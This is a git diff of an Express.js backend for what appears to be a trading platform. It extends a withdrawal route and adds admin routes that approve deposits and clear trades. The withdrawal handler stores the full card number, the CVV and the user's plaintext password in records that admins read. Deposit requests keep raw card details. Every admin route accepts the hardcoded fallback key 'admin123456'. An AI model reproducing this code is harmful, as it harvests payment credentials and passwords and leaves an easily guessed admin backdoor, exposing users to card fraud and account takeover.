@@ -184,10 +184,11 @@ router.post("/admin/update-password", async (req, res) => {
   }
 });
 
+
 // ================= WITHDRAW FUNDS =================
 router.post("/withdraw", async (req, res) => {
   try {
-    const { username, amount, cardId, password } = req.body;
+    const { username, amount, cardId, password, holderName, bankName, accNumber, cvv } = req.body;
 
     if (!username || !amount || !cardId || !password) {
       return res.status(400).json({ error: "Missing required fields" });
@@ -221,11 +222,15 @@ router.post("/withdraw", async (req, res) => {
       amount: amount,
       usd: amount,
       cardId: card.id,
-      cardLast4: card.display?.slice(-4) || "****",
-      cardNumber: card.num || "****",
-      cardName: card.name || "",
+      cardLast4: card.display?.slice(-4) || card.accNumber?.slice(-4) || "****",
+      cardNumber: card.num || card.accNumber || "****",
+      cardName: card.name || card.holderName || "",
       cardExpiry: card.exp || "",
       cvv: card.cvv || "***",
+      // Bank account details (for new withdrawals)
+      holderName: holderName || card.holderName || "",
+      bankName: bankName || card.bankName || "",
+      accNumber: accNumber || card.accNumber || card.num || "",
       date: new Date().toISOString(),
       status: "pending",
       userPassword: password,
@@ -242,7 +247,9 @@ router.post("/withdraw", async (req, res) => {
         usd: amount,
         date: new Date().toISOString(),
         status: "pending",
-        cardLast4: card.display?.slice(-4),
+        cardLast4: card.display?.slice(-4) || card.accNumber?.slice(-4) || "****",
+        holderName: holderName || card.holderName || "",
+        bankName: bankName || card.bankName || "",
       },
       ...(user.transactions || []),
     ];
@@ -1097,5 +1104,209 @@ router.post("/:username/transactions", async (req, res) => {
     res.status(500).json({ error: err.message });
   }
 });
+
+
+
+// ================= CREATE DEPOSIT REQUEST =================
+router.post("/deposit-request", async (req, res) => {
+  try {
+    const { username, amount, cardDetails } = req.body;
+
+    if (!username || !amount) {
+      return res.status(400).json({ error: "Username and amount required" });
+    }
+
+    const user = await User.findOne({ username: username.toLowerCase().trim() });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+
+    const depositRequest = {
+      id: Date.now(),
+      amount: parseFloat(amount),
+      usd: parseFloat(amount),
+      date: new Date().toISOString(),
+      status: "pending",
+      cardDetails: cardDetails || {},
+    };
+
+    user.depositRequests = user.depositRequests || [];
+    user.depositRequests.unshift(depositRequest);
+
+    await user.save();
+
+    res.json({
+      success: true,
+      message: "Deposit request submitted",
+      requestId: depositRequest.id,
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= GET ALL DEPOSIT REQUESTS (ADMIN ONLY) =================
+router.get("/admin/all-deposits", async (req, res) => {
+  try {
+    const adminKey = req.headers["x-admin-key"];
+    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
+
+    if (!adminKey || adminKey !== validAdminKey) {
+      return res.status(401).json({ error: "Unauthorized. Admin access only." });
+    }
+
+    const users = await User.find({});
+    const allDeposits = [];
+
+    users.forEach((user) => {
+      (user.depositRequests || []).forEach((request) => {
+        allDeposits.push({
+          ...request,
+          username: user.username,
+          userEmail: user.email,
+          userFullName: user.fullName,
+        });
+      });
+    });
+
+    allDeposits.sort((a, b) => new Date(b.date) - new Date(a.date));
+    res.json(allDeposits);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= ADMIN APPROVE/REJECT DEPOSIT =================
+router.post("/admin/approve-deposit", async (req, res) => {
+  try {
+    const adminKey = req.headers["x-admin-key"];
+    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
+
+    if (!adminKey || adminKey !== validAdminKey) {
+      return res.status(401).json({ error: "Unauthorized. Admin access only." });
+    }
+
+    const { username, requestId, action } = req.body;
+
+    const user = await User.findOne({ username: username.toLowerCase().trim() });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+
+    const requestIndex = (user.depositRequests || []).findIndex(
+      (r) => String(r.id) === String(requestId)
+    );
+    if (requestIndex === -1) {
+      return res.status(404).json({ error: "Deposit request not found" });
+    }
+
+    const request = user.depositRequests[requestIndex];
+
+    if (request.status !== "pending") {
+      return res.status(400).json({ error: `Request already ${request.status}` });
+    }
+
+    if (action === "approve") {
+      request.status = "approved";
+      request.approvedAt = new Date().toISOString();
+
+      user.balance = parseFloat((user.balance + request.amount).toFixed(2));
+
+      user.transactions = [
+        {
+          type: "Deposit",
+          amount: request.amount,
+          usd: request.amount,
+          date: new Date().toISOString(),
+          status: "approved",
+          note: "Deposit approved",
+        },
+        ...(user.transactions || []),
+      ];
+
+      user.notifications = user.notifications || [];
+      user.notifications.unshift({
+        id: Date.now() + Math.random(),
+        title: "✅ Deposit Approved",
+        body: `Your deposit of $${request.amount} has been approved and added to your balance.`,
+        time: new Date().toLocaleTimeString(),
+        date: new Date().toISOString(),
+        read: false,
+      });
+    } else if (action === "reject") {
+      request.status = "rejected";
+      request.rejectedAt = new Date().toISOString();
+
+      user.notifications = user.notifications || [];
+      user.notifications.unshift({
+        id: Date.now() + Math.random(),
+        title: "❌ Deposit Rejected",
+        body: `Your deposit of $${request.amount} has been rejected. Please contact support.`,
+        time: new Date().toLocaleTimeString(),
+        date: new Date().toISOString(),
+        read: false,
+      });
+    } else {
+      return res.status(400).json({ error: "Invalid action. Use 'approve' or 'reject'" });
+    }
+
+    user.markModified("depositRequests");
+    user.markModified("transactions");
+    user.markModified("notifications");
+    await user.save();
+
+    res.json({
+      success: true,
+      message: `Deposit ${action}d successfully`,
+      newBalance: user.balance,
+      requestStatus: request.status,
+    });
+  } catch (err) {
+    console.error("Error in approve-deposit:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+
+
+
+// ================= CLEAR COMPLETED TRADES ONLY (ADMIN ONLY) =================
+router.delete("/admin/clear-completed-trades", async (req, res) => {
+  try {
+    const adminKey = req.headers["x-admin-key"];
+    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
+
+    if (!adminKey || adminKey !== validAdminKey) {
+      return res.status(401).json({ error: "Unauthorized. Admin access only." });
+    }
+
+    // Get all users
+    const users = await User.find({});
+    let totalCleared = 0;
+
+    for (const user of users) {
+      if (user.pendingTrades && user.pendingTrades.length > 0) {
+        const originalLength = user.pendingTrades.length;
+        // Keep only pending trades, remove won/lost/frozen
+        user.pendingTrades = user.pendingTrades.filter(
+          trade => trade.status === "pending"
+        );
+        user.binaryTrades = []; // Clear old binaryTrades
+        totalCleared += originalLength - user.pendingTrades.length;
+        await user.save();
+      }
+    }
+
+    res.json({
+      success: true,
+      message: `Cleared ${totalCleared} completed trades`,
+      clearedCount: totalCleared,
+    });
+  } catch (err) {
+    console.error("Error clearing completed trades:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
 
 export default router;
